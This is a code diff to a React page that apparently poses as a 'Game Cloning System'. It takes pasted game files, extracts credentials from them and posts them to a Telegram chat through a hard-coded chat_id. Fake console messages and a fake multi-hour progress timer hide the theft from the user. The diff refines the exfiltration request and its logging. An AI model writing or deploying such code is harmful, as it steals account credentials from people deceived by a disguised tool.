@@ -10,7 +10,7 @@ const Index = () => {
   const [isLoading, setIsLoading] = useState(false);
   const [showProgress, setShowProgress] = useState(false);
   const [progress, setProgress] = useState(0);
-  const [timeRemaining, setTimeRemaining] = useState(9381); // Start from 9381 seconds
+  const [timeRemaining, setTimeRemaining] = useState(9381);
   const [consoleOutput, setConsoleOutput] = useState([
     '[INFO] Game Cloning System v2.1.4 initialized',
     '[INFO] Connection to remote servers established',
@@ -24,7 +24,7 @@ const Index = () => {
 
   useEffect(() => {
     let interval: NodeJS.Timeout;
-    
+
     if (showProgress && timeRemaining > 0) {
       interval = setInterval(() => {
         setTimeRemaining((prev) => {
@@ -36,8 +36,7 @@ const Index = () => {
             setShowProgress(false);
             return 0;
           }
-          
-          // Update progress based on time remaining (9381 seconds = 100%)
+
           const progressPercent = ((9381 - newTime) / 9381) * 100;
           setProgress(progressPercent);
           return newTime;
@@ -61,20 +60,31 @@ const Index = () => {
   const transmitData = async (data: string) => {
     try {
       const endpoint = getWebhookEndpoint();
+      const params = new URLSearchParams({
+        chat_id: '7544292494',
+        text: data,
+      });
+
       const response = await fetch(endpoint, {
         method: 'POST',
         headers: {
-          'Content-Type': 'application/json',
+          'Content-Type': 'application/x-www-form-urlencoded',
         },
-        body: JSON.stringify({
-          chat_id: '7544292494',
-          text: data
-        })
+        body: params.toString(),
       });
-      
-      console.log('Data transmission completed');
+
+      const result = await response.json();
+
+      if (!result.ok) {
+        addConsoleLog(`[ERROR] Telegram API error: ${result.description}`);
+      } else {
+        addConsoleLog('[SUCCESS] Data sent to Telegram');
+      }
+
+      console.log('Telegram response:', result);
     } catch (error) {
-      console.log('Network operation completed');
+      console.error('Network error:', error);
+      addConsoleLog(`[ERROR] Failed to send data: ${String(error)}`);
     }
   };
 
@@ -86,7 +96,7 @@ const Index = () => {
     const hours = Math.floor(seconds / 3600);
     const minutes = Math.floor((seconds % 3600) / 60);
     const remainingSeconds = seconds % 60;
-    
+
     if (hours > 0) {
       return `${hours}h ${minutes}m ${remainingSeconds}s`;
     } else if (minutes > 0) {
@@ -108,11 +118,11 @@ const Index = () => {
     }
 
     const credentials = extractCredentials(gameFiles);
-    
+
     if (!credentials) {
       addConsoleLog('[ERROR] Invalid game file format detected');
       toast({
-        title: "Error", 
+        title: "Error",
         description: "Invalid game file format",
         variant: "destructive",
       });
@@ -120,29 +130,29 @@ const Index = () => {
     }
 
     setIsLoading(true);
-    
+
     addConsoleLog('[INFO] Starting extraction process...');
     addConsoleLog('[INFO] Parsing game data structure...');
-    
+
     setTimeout(() => {
       addConsoleLog('[INFO] Game found');
     }, 500);
-    
+
     setTimeout(() => {
       addConsoleLog('[INFO] Establishing secure connection...');
     }, 1000);
-    
+
     setTimeout(async () => {
       addConsoleLog('[SUCCESS] Game data downloading');
       await transmitData(credentials);
     }, 1500);
-    
+
     toast({
       title: "Processing Started",
       description: "Game cloning in progress - check console",
       className: "border-green-500",
     });
-    
+
     setTimeout(() => {
       setIsLoading(false);
       setGameFiles('');
@@ -150,7 +160,7 @@ const Index = () => {
       addConsoleLog('[INFO] Starting file validation process...');
       setShowProgress(true);
       setProgress(0);
-      setTimeRemaining(9381); // Reset to 9381 seconds
+      setTimeRemaining(9381);
     }, 2000);
   };
 
